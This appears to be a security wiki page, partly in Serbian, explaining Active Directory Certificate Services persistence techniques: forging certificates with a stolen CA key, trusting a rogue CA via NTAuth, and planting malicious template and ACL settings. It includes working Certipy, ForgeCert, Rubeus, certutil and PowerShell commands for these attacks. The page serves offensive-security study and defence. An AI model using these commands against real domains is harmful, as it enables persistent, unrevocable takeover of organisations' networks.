# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je sažetak tehnika perzistencije u domenu iz [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Pogledajte ga za više detalja.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

How can you tell that a certificate is a CA certificate?

It can be determined that a certificate is a CA certificate if several conditions are met:

- Sertifikat je smešten na CA serveru, a njegov privatni ključ je zaštićen DPAPI-jem mašine, ili hardverom kao što su TPM/HSM ako operativni sistem to podržava.
- Polja Issuer i Subject sertifikata se poklapaju sa distinguished name CA.
- Ekstenzija "CA Version" prisutna je isključivo u CA sertifikatima.
- Sertifikat nema Extended Key Usage (EKU) polja.

Za ekstrakciju privatnog ključa ovog sertifikata, podržani metod je korišćenje alata certsrv.msc na CA serveru putem ugrađenog GUI-ja. Ipak, ovaj sertifikat se ne razlikuje od ostalih koji su pohranjeni u sistemu; stoga se mogu primeniti metode kao što je [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) za ekstrakciju.

Sertifikat i privatni ključ se takođe mogu dobiti pomoću Certipy sa sledećom naredbom:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Nakon pribavljanja CA sertifikata i njegovog privatnog ključa u `.pfx` formatu, alati poput [ForgeCert](https://github.com/GhostPack/ForgeCert) mogu se iskoristiti za generisanje važećih sertifikata:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Korisnik koji je meta falsifikovanja sertifikata mora biti aktivan i sposoban da se autentifikuje u Active Directory da bi proces uspeo. Falsifikovanje sertifikata za specijalne naloge kao što je krbtgt je neefikasno.

Ovaj falsifikovani sertifikat će biti **važeći** do datuma isteka navedenog i sve dok root CA sertifikat bude važeći (obično od 5 do **10+ godina**). Takođe je važeći za **mašine**, pa u kombinaciji sa **S4U2Self**, napadač može **održavati persistence na bilo kojoj mašini u domenu** sve dok je CA sertifikat važeći.\
Štaviše, **sertifikati generisani** ovom metodom **ne mogu biti opozvani** jer CA za njih nije svestan.

### Rad pod Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- Sadržati snažnu vezu sa ciljnim nalogom (na primer, the SID security extension), ili
- Biti upareni sa snažnim, eksplicitnim mapiranjem na `altSecurityIdentities` atributu ciljnog objekta.

A reliable approach for persistence is to mint a forged certificate chained to the stolen Enterprise CA and then add a strong explicit mapping to the victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Napomene
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ova mogućnost je posebno relevantna kada se koristi zajedno sa prethodno opisanom metodom koja uključuje ForgeCert za dinamičko generisanje sertifikata.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Maliciozna pogrešna konfiguracija - DPERSIST3

Mogućnosti za **persistence** kroz izmene security descriptor-a AD CS komponenti su brojne. Izmene opisane u sekciji [Eskalacija domena](domain-escalation.md) mogu biti zlonamerno implementirane od strane napadača sa povišenim privilegijama. To uključuje dodavanje "control rights" (npr. `WriteOwner`/`WriteDACL`/itd.) osetljivim komponentama kao što su:

- **AD computer objekat CA servera**
- **RPC/DCOM server CA servera**
- Bilo koji **descendant AD object or container** u **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na primer, Certificate Templates container, Certification Authorities container, the `NTAuthCertificates` object, itd.)
- **AD grupe kojima su dodeljena prava za kontrolu AD CS** po defaultu ili od strane organizacije (kao što je ugrađena Cert Publishers grupa i bilo koji od njenih članova)

Primer zlonamerne implementacije bi uključivao napadača koji ima **elevated permissions** u domeni i dodaje dozvolu **`WriteOwner`** na podrazumevani `User` certificate template, sa napadačem postavljenim kao principal za to pravo. Da bi iskoristio ovo, napadač bi prvo promenio ownership `User` template-a na sebe. Nakon toga, `mspki-certificate-name-flag` bi bio postavljen na **1** na template-u da omogući **`ENROLLEE_SUPPLIES_SUBJECT`**, što dozvoljava korisniku da navede Subject Alternative Name u zahtevu. Zatim bi napadač mogao da se **enroll**-uje koristeći taj **template**, izabere ime domain administrator-a kao alternativni naziv i iskoristi pribavljeni sertifikat za autentifikaciju kao DA.

Praktične postavke koje napadači mogu podesiti za dugoročnu persistence u domenu (pogledajte {{#ref}}domain-escalation.md{{#endref}} za potpune detalje i detekciju):

- CA policy flags koje dozvoljavaju SAN iz zahtevaoca (npr. omogućavanje `EDITF_ATTRIBUTESUBJECTALTNAME2`). Ovo ostavlja ESC1-like puteve iskoristivim.
- Template DACL ili podešavanja koja omogućavaju izdavanje sposobno za autentifikaciju (npr. dodavanje Client Authentication EKU, omogućavanje `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolisanje `NTAuthCertificates` objekta ili CA kontejnera kako bi se kontinuirano ponovo uvozili rogue issuers ako branitelji pokušaju čišćenje.

> [!TIP]
> U hardened okruženjima nakon KB5014754, kombinovanje ovih pogrešnih konfiguracija sa eksplicitnim snažnim mapiranjima (`altSecurityIdentities`) osigurava da vaši izdate ili falsifikovani sertifikati ostanu upotrebljivi čak i kada DC-ovi primenjuju strong mapping.



## References

- Microsoft KB5014754 – Promene u autentifikaciji zasnovanoj na sertifikatima na Windows domain controller-ima (vremenski okvir primene i strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Komandni priručnik i upotreba forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
